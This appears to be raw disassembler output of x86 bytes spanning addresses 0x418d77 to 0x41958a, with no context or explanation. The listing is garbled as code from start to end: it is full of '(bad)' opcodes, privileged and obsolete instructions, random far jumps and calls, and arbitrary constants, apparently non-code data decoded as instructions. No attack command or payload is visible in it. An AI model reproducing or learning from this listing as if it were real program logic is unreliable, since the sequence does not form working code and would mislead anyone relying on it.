  418d77:	fisubr WORD PTR [ebx-0x27]
  418d7a:	mov    ecx,0x429db345
  418d7f:	cmp    BYTE PTR [eax+esi*4],dh
  418d82:	icebp  
  418d83:	push   eax
  418d84:	sti    
  418d85:	mov    ebx,0x91b26b71
  418d8a:	fimul  DWORD PTR [ebx+0x44]
  418d8d:	cmp    ch,BYTE PTR [ebp-0x2d]
  418d90:	(bad)  
  418d91:	aaa    
  418d92:	add    DWORD PTR [ebp-0x37e64894],esp
  418d98:	inc    ebx
  418d99:	xor    cl,bl
  418d9b:	xchg   ebp,eax
  418d9c:	push   0xffffffc5
  418d9e:	xchg   edi,eax
  418d9f:	adc    ch,BYTE PTR [ebx+0x25]
  418da2:	push   ds
  418da3:	es pop ss
  418da5:	gs xchg ecx,eax
  418da7:	pop    eax
  418da8:	outs   dx,BYTE PTR ds:[esi]
  418da9:	shl    DWORD PTR [edx],0x95
  418dac:	stos   DWORD PTR es:[edi],eax
  418dad:	xchg   edx,eax
  418dae:	in     eax,0xd4
  418db0:	jl     0x418e21
  418db2:	in     al,0x11
  418db4:	daa    
  418db5:	inc    eax
  418db6:	mov    ebx,0x73d3552e
  418dbb:	inc    ebx
  418dbc:	fild   QWORD PTR [edi+0x1d]
  418dbf:	push   edi
  418dc0:	sub    eax,0xd45440b3
  418dc5:	or     ah,bl
  418dc7:	jae    0x418db9
  418dc9:	adc    ah,al
  418dcb:	ds jle 0x418df1
  418dce:	push   ebp
  418dcf:	and    al,0x5a
  418dd1:	jg     0x418df6
  418dd3:	jg     0x418d7a
  418dd5:	mov    edx,0x9ebd35ec
  418dda:	mov    edi,0xd6e6ba8f
  418ddf:	imul   ebp,DWORD PTR [edi-0x175293e2],0xdac45780
  418de9:	jno    0x418d8d
  418deb:	jl     0x418e6b
  418ded:	aaa    
  418dee:	mov    eax,ds:0xcb40b8b9
  418df3:	and    eax,0xd594b69
  418df8:	cmc    
  418df9:	hlt    
  418dfa:	test   DWORD PTR [edx+0x34a4414],esi
  418e00:	imul   ecx,DWORD PTR [ebx-0x51],0xffffffb7
  418e04:	popa   
  418e05:	scas   eax,DWORD PTR es:[edi]
  418e06:	sub    al,0x29
  418e08:	inc    ebx
  418e09:	fidivr DWORD PTR [edi]
  418e0b:	repz shl bl,cl
  418e0e:	inc    esi
  418e0f:	xchg   esi,eax
  418e10:	mov    ebx,0xe1f3fb84
  418e15:	dec    esp
  418e16:	inc    eax
  418e17:	sub    DWORD PTR [ecx],ecx
  418e19:	inc    esi
  418e1a:	fbld   TBYTE PTR [ecx-0x55cfc21]
  418e20:	inc    esi
  418e21:	loopne 0x418e62
  418e23:	stos   BYTE PTR es:[edi],al
  418e24:	cs loope 0x418e51
  418e27:	jp     0x418df0
  418e29:	mov    bl,0xec
  418e2b:	sub    DWORD PTR [bp-0x3f],ecx
  418e2f:	xlat   BYTE PTR ds:[ebx]
  418e30:	mov    ch,0xe2
  418e32:	jnp    0x418dff
  418e34:	or     eax,0xce491da9
  418e39:	mul    ebx
  418e3b:	cmp    dh,bh
  418e3d:	fs sti 
  418e3f:	or     al,0xdd
  418e41:	adc    DWORD PTR [eax],esi
  418e43:	addr16 mov cl,0xe2
  418e46:	sbb    eax,0x1a64cf16
  418e4b:	pop    ebx
  418e4c:	mov    ?,WORD PTR [edx+0x7e3dac96]
  418e52:	and    eax,0x7222fc32
  418e57:	jmp    0x3990:0x5a9fc19e
  418e5e:	ja     0x418e7c
  418e60:	int3   
  418e61:	cmp    cl,dh
  418e63:	sbb    dh,dl
  418e65:	pop    esi
  418e66:	rcl    dh,1
  418e68:	pusha  
  418e69:	pop    esi
  418e6a:	sub    ebx,0xa095943d
  418e70:	dec    ebx
  418e71:	xchg   ecx,eax
  418e72:	aad    0x26
  418e74:	xchg   ebp,eax
  418e75:	jmp    0xef81:0x34f267d5
  418e7c:	aad    0x63
  418e7e:	out    0x5b,eax
  418e80:	mov    al,ds:0x565e54f0
  418e85:	ins    BYTE PTR es:[edi],dx
  418e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e87:	(bad)
  418e8a:	xchg   edx,eax
  418e8b:	inc    eax
  418e8c:	pop    ecx
  418e8d:	adc    eax,0xee33d99c
  418e92:	mov    cl,0xe8
  418e94:	xor    al,ah
  418e96:	mov    WORD PTR [edi],gs
  418e98:	jge    0x418f15
  418e9a:	sub    eax,0x2db5e6d2
  418e9f:	add    dh,BYTE PTR ds:0x7dcbbe6a
  418ea5:	or     ah,dl
  418ea7:	fdiv   DWORD PTR [edi]
  418ea9:	sbb    esp,eax
  418eab:	jmp    0x4103:0x749cf7c8
  418eb2:	test   DWORD PTR [esi],0x13f233f
  418eb8:	pop    esp
  418eb9:	cwde   
  418eba:	pop    ds
  418ebb:	(bad)  
  418ebc:	(bad)  
  418ebd:	push   0x3aa95429
  418ec2:	and    ah,ah
  418ec4:	cmp    edi,DWORD PTR [ecx-0x51]
  418ec7:	gs test BYTE PTR cs:[ebx],dl
  418ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ecc:	lahf   
  418ecd:	test   eax,0x32c48d75
  418ed2:	shl    DWORD PTR [esp+edi*1-0x51],0x8e
  418ed7:	dec    esp
  418ed8:	sub    al,bl
  418eda:	dec    esi
  418edb:	mov    BYTE PTR fs:[edx+ecx*2+0x2e1cfbd2],cl
  418ee3:	fcomp  st(7)
  418ee5:	out    0x54,al
  418ee7:	sub    ch,BYTE PTR [ebp-0x25]
  418eea:	mov    ah,0xa7
  418eec:	pop    ds
  418eed:	dec    ebx
  418eee:	sub    eax,0xbb70a1d3
  418ef3:	push   eax
  418ef4:	pop    ebx
  418ef5:	lods   eax,DWORD PTR ds:[esi]
  418ef6:	adc    al,0xb8
  418ef8:	rcl    BYTE PTR [ecx+eiz*2],cl
  418efb:	jg     0x418eb4
  418efd:	leave  
  418efe:	cmp    eax,0x1a3ffd2e
  418f03:	aaa    
  418f04:	sti    
  418f05:	loopne 0x418f4c
  418f07:	sub    al,BYTE PTR [esi+edi*8+0x66]
  418f0b:	inc    esp
  418f0c:	push   0x0
  418f0e:	loop   0x418f5d
  418f10:	leave  
  418f11:	(bad)  
  418f12:	fdivr  st,st(7)
  418f14:	repz mov ?,ebx
  418f17:	pop    esp
  418f18:	ret    0xfb52
  418f1b:	pop    ecx
  418f1c:	call   DWORD PTR [edx+0x3d]
  418f1f:	ins    DWORD PTR es:[di],dx
  418f21:	les    eax,FWORD PTR [edi-0x31]
  418f24:	mov    ah,0xab
  418f26:	fnsetpm(287 only) 
  418f28:	sahf   
  418f29:	in     al,dx
  418f2a:	jmp    0x418f8b
  418f2c:	adc    eax,0xc1889f7c
  418f31:	push   ebp
  418f32:	mov    esp,0x524b92ec
  418f37:	call   0x27df7398
  418f3c:	adc    BYTE PTR [eax-0x5fb41667],bl
  418f42:	sbb    BYTE PTR [ecx+edi*4],al
  418f45:	mov    esp,0x30b0f4f3
  418f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f4b:	enter  0x6166,0xa6
  418f4f:	dec    esi
  418f50:	test   eax,0x112fc2e1
  418f55:	dec    ecx
  418f56:	inc    edi
  418f57:	jb     0x418fd1
  418f59:	pop    ebp
  418f5a:	jne    0x418ee4
  418f5c:	leave  
  418f5d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  418f5f:	icebp  
  418f60:	add    dl,bl
  418f62:	(bad)  
  418f63:	jle    0x418f8b
  418f65:	es sbb edi,0xffffff9a
  418f69:	popa   
  418f6a:	mov    ecx,0x80734826
  418f6f:	push   esp
  418f70:	sbb    al,0x99
  418f72:	sti    
  418f73:	jne    0x418efa
  418f75:	cmp    al,0x9d
  418f77:	and    BYTE PTR [edx+0x32d5e54a],ch
  418f7d:	add    ebx,ebp
  418f7f:	mov    dh,0x89
  418f81:	loope  0x418ffe
  418f83:	mov    eax,ds:0x29de7e79
  418f88:	add    al,0x8
  418f8a:	push   ecx
  418f8b:	mov    ds:0xa556863a,al
  418f90:	cmp    eax,0xe8c3bd5e
  418f95:	pop    ebp
  418f96:	shl    DWORD PTR [edi+0x36c660c8],1
  418f9c:	ret    0x52e
  418f9f:	dec    eax
  418fa0:	frstor [ecx-0x16]
  418fa3:	sbb    DWORD PTR [ebx],esi
  418fa5:	xchg   edi,eax
  418fa6:	and    eax,0xb7d1c766
  418fab:	bound  ebp,QWORD PTR [edx+0x63]
  418fae:	mov    cl,0xb8
  418fb0:	gs jno 0x418fb0
  418fb3:	std    
  418fb4:	pushf  
  418fb5:	inc    ebx
  418fb6:	(bad)  
  418fb7:	fsubr  DWORD PTR [edx-0x6fd6421f]
  418fbd:	cli    
  418fbe:	test   al,0xd3
  418fc0:	dec    esp
  418fc1:	mov    eax,0x7cf27c59
  418fc6:	call   0x2c71:0x4cfe9f9e
  418fcd:	imul   edx,DWORD PTR [eax],0xb14688d8
  418fd3:	mul    ah
  418fd5:	xor    dh,BYTE PTR [ebp-0x6c532fa6]
  418fdb:	ret    
  418fdc:	jle    0x418f7b
  418fde:	aad    0x7d
  418fe0:	sti    
  418fe1:	hlt    
  418fe2:	push   esi
  418fe3:	loope  0x41904a
  418fe5:	mov    al,ds:0x14ee9639
  418fea:	xchg   BYTE PTR [esi],cl
  418fec:	mov    BYTE PTR es:[edx],ch
  418fef:	push   esp
  418ff0:	cmp    esp,DWORD PTR [ebx+0x13]
  418ff3:	adc    esp,DWORD PTR ds:0x3a7d972c
  418ff9:	xlat   BYTE PTR ds:[ebx]
  418ffa:	inc    eax
  418ffb:	mov    ss,WORD PTR [ecx-0x4b662389]
  419001:	clc    
  419002:	jne    0x418fa4
  419004:	iret   
  419005:	cmp    dh,BYTE PTR [ecx-0x5fc13c5d]
  41900b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41900c:	pop    ds
  41900d:	loope  0x419034
  41900f:	push   ecx
  419010:	icebp  
  419011:	mov    dl,0x9e
  419013:	mov    bl,0x4b
  419015:	xchg   ebx,eax
  419016:	adc    eax,DWORD PTR [eax+edx*1-0x1fd9b956]
  41901d:	dec    edx
  41901e:	dec    ecx
  41901f:	icebp  
  419020:	and    al,0x4e
  419022:	test   eax,0xfc5c13c0
  419027:	mov    ebp,0xd12be1c
  41902c:	xor    DWORD PTR [edi-0x50],0x50b0159d
  419033:	sahf   
  419034:	sub    eax,0x25160a1c
  419039:	inc    esp
  41903a:	mov    ebx,0x45196e02
  41903f:	sbb    ebp,DWORD PTR [esp+edx*1-0x514fd6d2]
  419046:	push   ebx
  419047:	imul   ebx,DWORD PTR [ebx-0x82b17aa],0x3a
  41904e:	or     DWORD PTR [ecx+0x33],esi
  419051:	jge    0x41902a
  419053:	add    DWORD PTR [esi-0x353192e2],edi
  419059:	cmp    BYTE PTR [ebx-0x3],al
  41905c:	mov    esi,0x77a127e3
  419061:	push   ebp
  419062:	inc    edi
  419063:	mov    eax,ds:0xdab8d378
  419068:	jb     0x4190aa
  41906a:	xchg   ebp,eax
  41906b:	jbe    0x419001
  41906d:	ins    DWORD PTR es:[edi],dx
  41906e:	inc    eax
  41906f:	call   0xe1668160
  419074:	clc    
  419075:	adc    cl,BYTE PTR [ecx]
  419077:	jae    0x419050
  419079:	fcomp  QWORD PTR [edi-0x5ad4b530]
  41907f:	js     0x419060
  419081:	sub    BYTE PTR [esp+eiz*8],dh
  419084:	call   0x66c5c8da
  419089:	mov    ch,0xaf
  41908b:	std    
  41908c:	std    
  41908d:	adc    al,0xd6
  41908f:	test   DWORD PTR [ebx*1+0x5aaa5962],ebp
  419096:	sar    bh,0xe9
  419099:	pop    ebx
  41909a:	inc    ebx
  41909b:	cld    
  41909c:	ins    DWORD PTR es:[edi],dx
  41909d:	mov    ?,WORD PTR [edi-0x6deab84f]
  4190a3:	int    0x69
  4190a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190a6:	mov    esi,0xa6af9fcc
  4190ab:	or     al,0x36
  4190ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190ae:	xor    BYTE PTR [ecx+edx*8-0x4977dade],bl
  4190b5:	stos   DWORD PTR es:[edi],eax
  4190b6:	pop    ss
  4190b7:	pop    ebp
  4190b8:	or     eax,DWORD PTR [ecx+0x42]
  4190bb:	push   cs
  4190bc:	push   ecx
  4190bd:	and    eax,0xb3790970
  4190c2:	jbe    0x41904f
  4190c4:	test   al,0x5f
  4190c6:	jb     0x4190cc
  4190c8:	scas   eax,DWORD PTR es:[edi]
  4190c9:	or     DWORD PTR [ebx],ecx
  4190cb:	enter  0xbf21,0x8b
  4190cf:	retf   
  4190d0:	inc    edi
  4190d1:	ins    DWORD PTR es:[edi],dx
  4190d2:	loopne 0x4190b7
  4190d4:	inc    edi
  4190d5:	retf   0x34f3
  4190d8:	int    0xce
  4190da:	pusha  
  4190db:	cli    
  4190dc:	sbb    al,0x38
  4190de:	pushf  
  4190df:	mov    cl,0x15
  4190e1:	xor    eax,0x9ad2af46
  4190e6:	cmp    al,0x33
  4190e8:	ds aaa 
  4190ea:	enter  0x5d8e,0x49
  4190ee:	icebp  
  4190ef:	inc    edi
  4190f0:	or     DWORD PTR [edx-0x3d],edx
  4190f3:	push   eax
  4190f4:	(bad)  
  4190f5:	ret    0xd009
  4190f8:	push   eax
  4190f9:	hlt    
  4190fa:	mov    dl,0xbe
  4190fc:	xchg   ecx,eax
  4190fd:	jle    0x4190e4
  4190ff:	sub    bl,BYTE PTR [eax-0x28e82625]
  419105:	mov    al,0xf5
  419107:	xchg   esi,eax
  419108:	xor    BYTE PTR [ebx-0x32f10737],bl
  41910e:	pop    esp
  41910f:	idiv   esp
  419111:	mov    al,BYTE PTR [ebx-0x6a]
  419114:	inc    edx
  419115:	xchg   ebp,eax
  419116:	mov    BYTE PTR [eax+0x11],ch
  419119:	(bad)  
  41911a:	jecxz  0x4190d1
  41911c:	mov    ds,ebx
  41911e:	imul   edx,ecx,0x6c
  419121:	mov    ds:0xda01c65b,eax
  419126:	or     dh,BYTE PTR [eax+0x3307f988]
  41912c:	sbb    BYTE PTR [ebp*2+0x40332c19],bh
  419133:	into   
  419134:	inc    BYTE PTR [ecx-0x57c73fc0]
  41913a:	mov    ebp,0xf4d97be2
  41913f:	sbb    eax,0xa12e7b47
  419144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419145:	adc    BYTE PTR [edx+esi*2+0x448b8a6a],cl
  41914c:	xchg   ch,al
  41914e:	fwait
  41914f:	rol    BYTE PTR [ecx],0x52
  419152:	mov    al,ds:0x6897f5da
  419157:	dec    ebx
  419158:	push   edx
  419159:	push   edx
  41915a:	nop
  41915b:	jp     0x419160
  41915d:	xor    ecx,DWORD PTR [ebp-0x72ca179b]
  419163:	push   ds
  419164:	xchg   esi,eax
  419165:	lds    bx,DWORD PTR [ebp-0x8]
  419169:	mov    ds:0x68912078,al
  41916e:	sbb    DWORD PTR [esp+edx*4],eax
  419171:	jmp    0xd349:0x70f2960f
  419178:	fcomp  DWORD PTR [edi-0x125f7a6a]
  41917e:	stos   BYTE PTR es:[edi],al
  41917f:	xchg   edi,eax
  419180:	sub    ch,BYTE PTR [eax+0x6537789b]
  419186:	(bad)  
  419187:	mov    al,ds:0x316cc043
  41918c:	shl    DWORD PTR [edx+0x44],cl
  41918f:	lahf   
  419190:	inc    ebp
  419191:	and    dl,BYTE PTR [ebx-0x403968e8]
  419197:	add    al,0x67
  419199:	xchg   DWORD PTR [ecx-0x6f32035],edx
  41919f:	mov    esi,0x5d69e07b
  4191a4:	push   edi
  4191a5:	int    0x88
  4191a7:	xor    bl,BYTE PTR [edx+0x552cfa93]
  4191ad:	mov    ah,bh
  4191af:	std    
  4191b0:	(bad)  [edi+0x593544cc]
  4191b6:	xchg   BYTE PTR [ebp+0x1358052b],bh
  4191bc:	aas    
  4191bd:	aad    0x79
  4191bf:	mov    DWORD PTR [edx+0x4f],ebx
  4191c2:	mov    esp,0xa9e4b3bb
  4191c7:	ret    0x28e0
  4191ca:	loope  0x4191fe
  4191cc:	arpl   WORD PTR ds:0x8025d201,si
  4191d2:	ret    
  4191d3:	cmp    BYTE PTR [edi+0x46e0c761],ch
  4191d9:	fucomip st,st(3)
  4191db:	sbb    dl,BYTE PTR [ebp-0x51d60561]
  4191e1:	cld    
  4191e2:	ret    0x9a09
  4191e5:	fs inc ebx
  4191e7:	mov    ch,0x8e
  4191e9:	(bad)  
  4191ea:	in     al,0xce
  4191ec:	daa    
  4191ed:	mov    bh,0xb9
  4191ef:	clc    
  4191f0:	setnp  BYTE PTR [ecx+0x7c14fb59]
  4191f7:	ret    
  4191f8:	jg     0x419260
  4191fa:	mov    ecx,0x49417f55
  4191ff:	push   ds
  419200:	sbb    DWORD PTR [esi+0x7babe9a5],eax
  419206:	call   0x6cc8:0xdf44d7f1
  41920d:	inc    edi
  41920e:	das    
  41920f:	repnz ss jmp 0x3301:0xdbe8ebfd
  419218:	imul   esp,DWORD PTR [eax-0x12],0xffffffd8
  41921c:	clc    
  41921d:	inc    ecx
  41921e:	push   cs
  41921f:	(bad)  
  419220:	jp     0x41929f
  419222:	or     DWORD PTR [ebp-0x55],edx
  419225:	xor    al,0x59
  419227:	call   0xe3de960b
  41922c:	cmp    al,0x2f
  41922e:	lahf   
  41922f:	rol    BYTE PTR [edi+0x28],0xda
  419233:	jns    0x419275
  419235:	sub    ecx,ebp
  419237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419238:	ins    DWORD PTR es:[edi],dx
  419239:	mov    bl,0x30
  41923b:	das    
  41923c:	xchg   DWORD PTR [eax],ebp
  41923e:	dec    eax
  41923f:	rcl    BYTE PTR [ebx+0x622a3c0e],cl
  419245:	ds mov edx,0x405b94ad
  41924b:	jnp    0x4191e4
  41924d:	mov    al,BYTE PTR ds:[eax+0x40]
  419251:	add    ah,BYTE PTR [eax+0x3a]
  419254:	add    ebp,edi
  419256:	xor    ebx,esi
  419258:	jmp    0xf37a3348
  41925d:	mov    ecx,0x4fb4c472
  419262:	cli    
  419263:	packsswb mm2,QWORD PTR [edi]
  419266:	cmp    edi,DWORD PTR [esi-0x3117729f]
  41926c:	xchg   edi,eax
  41926d:	cld    
  41926e:	out    0x39,al
  419270:	mov    ecx,0x664ebcfa
  419275:	inc    edi
  419276:	in     al,0x6b
  419278:	jl     0x419241
  41927a:	data16 fisttp DWORD PTR [esi-0x8]
  41927e:	imul   BYTE PTR [edi]
  419280:	test   BYTE PTR [ecx+0x5f4f5f12],0x5e
  419287:	popa   
  419288:	arpl   WORD PTR [ebp+0x4b],bx
  41928b:	shl    BYTE PTR [ebx+0xa],1
  41928e:	pop    ds
  41928f:	jmp    0x9d24e926
  419294:	add    eax,eax
  419296:	enter  0x2601,0xb
  41929a:	ds dec eax
  41929c:	pop    ds
  41929d:	pop    edi
  41929e:	aad    0x58
  4192a0:	(bad)  
  4192a1:	jbe    0x4192c0
  4192a3:	stos   DWORD PTR es:[edi],eax
  4192a4:	test   eax,0x225229c3
  4192a9:	into   
  4192aa:	mov    dl,0xfd
  4192ac:	jo     0x41926b
  4192ae:	retf   0xeae9
  4192b1:	popf   
  4192b2:	hlt    
  4192b3:	fcmovnbe st,st(3)
  4192b5:	lods   al,BYTE PTR ds:[esi]
  4192b6:	cld    
  4192b7:	xchg   ecx,eax
  4192b8:	outs   dx,BYTE PTR ds:[esi]
  4192b9:	mov    ecx,0xce563a15
  4192be:	mov    al,ds:0x67404bd6
  4192c3:	jp     0x4192c2
  4192c5:	jg     0x419300
  4192c7:	xchg   ebx,eax
  4192c8:	adc    al,0xc
  4192ca:	push   edi
  4192cb:	push   ds
  4192cc:	(bad)  
  4192ce:	push   eax
  4192cf:	jb     0x4192f1
  4192d1:	dec    edi
  4192d2:	stc    
  4192d3:	shl    BYTE PTR es:[edi],1
  4192d6:	sub    al,0xe8
  4192d8:	mov    eax,0xfebb5480
  4192dd:	ds xchg esp,eax
  4192df:	jecxz  0x4192ea
  4192e1:	mov    bl,0xc4
  4192e3:	add    dh,BYTE PTR cs:[edi]
  4192e6:	dec    ecx
  4192e7:	scas   al,BYTE PTR es:[edi]
  4192e8:	xor    esp,DWORD PTR [edi-0x1d]
  4192eb:	aam    0x27
  4192ed:	mov    esi,0x33d17744
  4192f2:	mov    ah,0x6
  4192f4:	fnstcw WORD PTR [eax]
  4192f6:	and    dl,BYTE PTR [edi-0x34]
  4192f9:	mov    esp,0x16e076a5
  4192fe:	test   al,0xbd
  419300:	push   es
  419301:	pop    esi
  419302:	lock cmp ch,BYTE PTR [ecx-0x7e99e358]
  419309:	push   cs
  41930a:	aaa    
  41930b:	sbb    esi,DWORD PTR [eax-0x71fa37e1]
  419311:	in     al,dx
  419312:	dec    ebx
  419313:	jge    0x41935a
  419315:	push   edi
  419316:	add    dh,BYTE PTR [ebp-0x49]
  419319:	mov    bl,0x5a
  41931b:	imul   esi,DWORD PTR [edx-0x2cbbb5cc],0xcaafe4c7
  419325:	aaa    
  419326:	jmp    0x4192c4
  419328:	popf   
  419329:	call   0x82ac389e
  41932e:	inc    ebp
  41932f:	push   edx
  419330:	xchg   edi,eax
  419331:	int    0xa6
  419333:	out    0x33,eax
  419335:	stos   BYTE PTR es:[edi],al
  419336:	xor    al,0x75
  419338:	mov    ch,0xa1
  41933a:	ja     0x41933a
  41933c:	lods   eax,DWORD PTR ds:[esi]
  41933d:	mov    esp,0xd61f7933
  419342:	and    cl,al
  419344:	push   ebp
  419345:	inc    esp
  419346:	sub    al,0x99
  419348:	gs enter 0xf5cf,0x78
  41934d:	xchg   ecx,eax
  41934e:	jl     0x419316
  419350:	cmp    ebp,DWORD PTR [eax+0xd]
  419353:	(bad)  
  419354:	call   0x759b:0xe7a38be0
  41935b:	repnz lods eax,DWORD PTR ds:[esi]
  41935d:	mov    esi,0xc6721cc2
  419362:	loop   0x419354
  419364:	repz cs cli 
  419367:	pop    esi
  419368:	lea    esp,[eax+edi*1]
  41936b:	fild   DWORD PTR [ebp+0x1b]
  41936e:	rdpmc  
  419370:	es retf 
  419372:	cmp    ebp,eax
  419374:	and    eax,0x40a3f356
  419379:	xchg   BYTE PTR [ecx],dl
  41937b:	push   0xce2fa1e9
  419380:	mov    ds:0x22680814,al
  419385:	xchg   ebp,eax
  419386:	or     edx,ebp
  419388:	push   es
  419389:	sub    DWORD PTR [ecx-0xa27a86d],0xfffffffc
  419390:	xchg   ebp,eax
  419391:	jl     0x419314
  419393:	std    
  419394:	pop    ds
  419395:	ds dec edx
  419397:	cli    
  419398:	ret    0xd22b
  41939b:	and    eax,0x14e4b22c
  4193a0:	es leave 
  4193a2:	xor    esi,DWORD PTR [edi+0x2a]
  4193a5:	inc    ebx
  4193a6:	iret   
  4193a7:	popf   
  4193a8:	scas   eax,DWORD PTR es:[edi]
  4193a9:	or     ah,bh
  4193ab:	fstp   DWORD PTR [ebp-0x4921b062]
  4193b1:	cld    
  4193b2:	aad    0x94
  4193b4:	(bad)  
  4193b5:	rcr    DWORD PTR [esi+0x5db289e6],1
  4193bb:	bound  ebp,QWORD PTR [eax-0x59]
  4193be:	int    0x9e
  4193c0:	push   ss
  4193c1:	into   
  4193c2:	mov    ?,WORD PTR [edx+0x3cc8bffa]
  4193c8:	test   BYTE PTR [ebp-0x3453042c],ah
  4193ce:	push   eax
  4193cf:	fs mov edx,0x31842ebc
  4193d5:	clc    
  4193d6:	mov    ds:0x4735683e,al
  4193db:	fcmovu st,st(3)
  4193dd:	cmp    eax,0xbf883a92
  4193e2:	fidiv  WORD PTR [edi]
  4193e4:	or     BYTE PTR [edx],bh
  4193e6:	adc    eax,0x530d1dc1
  4193eb:	sahf   
  4193ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193ed:	sub    eax,0x707a9c95
  4193f2:	dec    ebx
  4193f3:	add    al,0xda
  4193f5:	dec    DWORD PTR [ebx+0x61]
  4193f8:	inc    esi
  4193f9:	int3   
  4193fa:	or     edi,DWORD PTR [eax+0x5]
  4193fd:	cmp    bl,BYTE PTR [edi+0x7470a50]
  419403:	cs dec ecx
  419405:	ins    DWORD PTR es:[edi],dx
  419406:	in     al,0x3b
  419408:	addr16 pop es
  41940a:	inc    ecx
  41940b:	mov    dh,0xf4
  41940d:	cwde   
  41940e:	(bad)  
  41940f:	lahf   
  419410:	adc    al,0x59
  419412:	and    esp,DWORD PTR [eax]
  419414:	inc    bl
  419416:	sar    DWORD PTR [ebx-0x17],1
  419419:	sbb    eax,0x10b3cc07
  41941e:	jl     0x4193c6
  419420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419421:	dec    ebp
  419422:	mov    bh,BYTE PTR [ecx+0x3f]
  419425:	sti    
  419426:	adc    bh,BYTE PTR [ebx-0x339759ae]
  41942c:	push   eax
  41942d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41942e:	das    
  41942f:	cmp    bh,BYTE PTR [eax]
  419431:	push   cs
  419432:	and    eax,0x8959e59e
  419437:	inc    edi
  419438:	jb     0x41944f
  41943a:	imul   eax,DWORD PTR [esp+esi*4+0x476aea4c],0x5ca41bd
  419445:	jb     0x41945e
  419447:	push   ss
  419448:	push   0x7c
  41944a:	call   0xa6a9:0xed900540
  419451:	xor    al,0xbd
  419453:	mov    eax,0xed09ceb2
  419458:	lahf   
  419459:	stc    
  41945a:	imul   ebp,DWORD PTR [ecx+0x52ed79ab],0x1e
  419461:	sbb    BYTE PTR [esi+eax*2-0x4e],cl
  419465:	out    dx,al
  419466:	fcomp  QWORD PTR [esi+0x2c]
  419469:	cmp    al,0x57
  41946b:	sub    al,0xd2
  41946d:	xchg   DWORD PTR [ebp+0x70],esp
  419470:	or     DWORD PTR [esi+edi*1-0x2230ea5f],0x988d2a81
  41947b:	jo     0x4194c7
  41947d:	xor    BYTE PTR [ebx],bl
  41947f:	jae    0x4194f8
  419481:	sbb    eax,0xc9ecf32c
  419486:	shr    DWORD PTR [ecx-0xe3da2f7],0x97
  41948d:	push   0xb0448666
  419492:	dec    ebp
  419493:	in     al,0x7
  419495:	cs ds and bh,bh
  419499:	fsub   QWORD PTR [edx]
  41949b:	pop    edx
  41949c:	test   DWORD PTR [edx],eax
  41949e:	out    0xd7,al
  4194a0:	stos   BYTE PTR es:[edi],al
  4194a1:	fxch   st(5)
  4194a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194a4:	ss icebp 
  4194a6:	or     BYTE PTR [esi],0xd9
  4194a9:	lahf   
  4194aa:	or     BYTE PTR [eax+0x22],dl
  4194ad:	mov    esp,0x887386ac
  4194b2:	cdq    
  4194b3:	in     al,dx
  4194b4:	aaa    
  4194b5:	mov    ch,0xfb
  4194b7:	mov    ss,WORD PTR [ebx+edi*2]
  4194ba:	aaa    
  4194bb:	xor    DWORD PTR [ecx-0x75],edx
  4194be:	cmc    
  4194bf:	mov    ch,0xb3
  4194c1:	pop    ss
  4194c2:	icebp  
  4194c3:	fisub  WORD PTR [ecx-0x5dee2631]
  4194c9:	xlat   BYTE PTR ds:[ebx]
  4194ca:	outs   dx,DWORD PTR ds:[esi]
  4194cb:	in     eax,dx
  4194cc:	mov    ds:0xbf2f5d28,eax
  4194d1:	push   edi
  4194d2:	push   eax
  4194d3:	and    cl,bh
  4194d5:	push   edx
  4194d6:	fist   DWORD PTR [esi-0x78bfac9d]
  4194dc:	mov    ah,0x11
  4194de:	loopne 0x41947c
  4194e0:	inc    esp
  4194e1:	call   0xf3f604fb
  4194e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e7:	push   esi
  4194e8:	leave  
  4194e9:	sub    cl,BYTE PTR [ecx]
  4194eb:	inc    ecx
  4194ec:	or     DWORD PTR [esi+eiz*1-0xafb230b],esp
  4194f3:	addr16 add eax,0x12d3f3e6
  4194f9:	lods   eax,DWORD PTR ds:[esi]
  4194fa:	daa    
  4194fb:	add    eax,0xea9daae1
  419500:	or     bl,BYTE PTR [ecx+0x40]
  419503:	and    eax,0xc7f9ba05
  419508:	clc    
  419509:	sbb    eax,0x7d564526
  41950e:	and    BYTE PTR [ebp-0x5d],0x3
  419512:	inc    eax
  419513:	and    al,dh
  419515:	inc    edx
  419516:	mov    bl,0x4d
  419518:	mov    dh,0x43
  41951a:	jno    0x41957d
  41951c:	add    al,BYTE PTR ds:0xd045ca20
  419522:	dec    eax
  419523:	mov    bl,0xce
  419525:	sti    
  419526:	cmp    DWORD PTR [edi+0x33],ebp
  419529:	mul    BYTE PTR [ecx-0x419a6aac]
  41952f:	frstor ds:0x2658836d
  419535:	cmc    
  419536:	iret   
  419537:	jae    0x419569
  419539:	xchg   edi,eax
  41953a:	repz adc eax,0x43e6128f
  419540:	int    0xe2
  419542:	and    DWORD PTR [ebp-0x7d0ef1fd],esp
  419548:	cmp    ch,dh
  41954a:	inc    esp
  41954b:	pop    DWORD PTR [eax]
  41954d:	jo     0x41951c
  41954f:	inc    ebx
  419550:	push   esp
  419551:	sti    
  419552:	add    eax,0x1f32e72
  419557:	mov    ebx,0xcda7759
  41955c:	pop    esp
  41955d:	outs   dx,BYTE PTR ds:[esi]
  41955e:	cs xchg esp,eax
  419560:	cdq    
  419561:	and    al,0x8b
  419563:	sti    
  419564:	in     eax,0xfe
  419566:	mov    edx,0xe935a95f
  41956b:	(bad)  
  41956c:	ins    BYTE PTR es:[edi],dx
  41956d:	pushf  
  41956e:	call   0x751e:0x9d0af4fc
  419575:	mov    WORD PTR [edx+eax*1],?
  419578:	lahf   
  419579:	mov    eax,ds:0xa9304638
  41957e:	out    dx,eax
  41957f:	add    DWORD PTR [edx],ecx
  419581:	aam    0x97
  419583:	test   eax,0x33dddc80
  419588:	add    al,0x8c
  41958a:	mov    dh,0x8b
